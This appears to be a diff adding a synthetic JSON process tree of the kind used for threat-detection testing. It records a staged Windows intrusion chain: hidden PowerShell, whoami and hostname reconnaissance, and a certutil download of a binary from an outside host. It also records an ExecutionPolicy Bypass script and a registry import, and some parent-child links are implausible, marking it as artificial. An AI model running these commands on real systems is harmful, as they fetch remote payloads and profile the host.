@@ -1,0 +1,126 @@
+{
+  "pid": 195699,
+  "ppid": 0,
+  "name": "CertMgrUI.exe",
+  "command": "CertMgrUI.exe /startup",
+  "children": [
+    {
+      "pid": 195700,
+      "ppid": 195699,
+      "name": "cmd.exe",
+      "command": "cmd.exe /c \"whoami /all\"",
+      "children": [
+        {
+          "pid": 195702,
+          "ppid": 195700,
+          "name": "powershell.exe",
+          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 10\"",
+          "children": [
+            {
+              "pid": 195708,
+              "ppid": 195702,
+              "name": "certutil.exe",
+              "command": "certutil.exe -urlcache -split -f \"http://cdn.contoso-updates.com/support/collector.bin\" \"C:\\ProgramData\\Northwind\\Collector\\agent.cab\"",
+              "children": [
+                {
+                  "pid": 195712,
+                  "ppid": 195708,
+                  "name": "whoami.exe",
+                  "command": "whoami.exe /priv",
+                  "children": [
+                    {
+                      "pid": 195714,
+                      "ppid": 195712,
+                      "name": "ping.exe",
+                      "command": "ping.exe -n 16 127.0.0.1 > nul",
+                      "children": [
+                        {
+                          "pid": 195717,
+                          "ppid": 195714,
+                          "name": "powershell.exe",
+                          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 3\"",
+                          "children": [
+                            {
+                              "pid": 195724,
+                              "ppid": 195717,
+                              "name": "certutil.exe",
+                              "command": "certutil.exe -dump \"C:\\Users\\rohan.patel\\AppData\\Local\\Temp\\corp_root.cer\"",
+                              "children": [
+                                {
+                                  "pid": 195728,
+                                  "ppid": 195724,
+                                  "name": "powershell.exe",
+                                  "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\ProgramData\\Wingtip\\Runtime\\RunDiagnostics_4e345ced.ps1\" -Host \"ENG-594\" -Mode Delta",
+                                  "children": [
+                                    {
+                                      "pid": 195731,
+                                      "ppid": 195728,
+                                      "name": "whoami.exe",
+                                      "command": "whoami.exe",
+                                      "children": [
+                                        {
+                                          "pid": 195738,
+                                          "ppid": 195731,
+                                          "name": "hostname.exe",
+                                          "command": "hostname.exe > \"C:\\Users\\rohan.patel\\AppData\\Local\\Temp\\host_933cfbc0.txt\"",
+                                          "children": [
+                                            {
+                                              "pid": 195749,
+                                              "ppid": 195738,
+                                              "name": "hostname.exe",
+                                              "command": "hostname.exe",
+                                              "children": [
+                                                {
+                                                  "pid": 195756,
+                                                  "ppid": 195749,
+                                                  "name": "reg.exe",
+                                                  "command": "reg.exe import \"C:\\Users\\rohan.patel\\AppData\\Local\\Temp\\Runtime_379f649d.reg\"",
+                                                  "children": [
+                                                    {
+                                                      "pid": 195762,
+                                                      "ppid": 195756,
+                                                      "name": "whoami.exe",
+                                                      "command": "whoami.exe /groups > \"C:\\Users\\rohan.patel\\AppData\\Local\\Temp\\who_336d0937.txt\"",
+                                                      "children": []
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "pid": 195741,
+      "ppid": 195699,
+      "name": "choice.exe",
+      "command": "choice.exe /d y /t 25 > nul",
+      "children": [
+        {
+          "pid": 195747,
+          "ppid": 195741,
+          "name": "powershell.exe",
+          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 14\"",
+          "children": []
+        }
+      ]
+    }
+  ]
+}
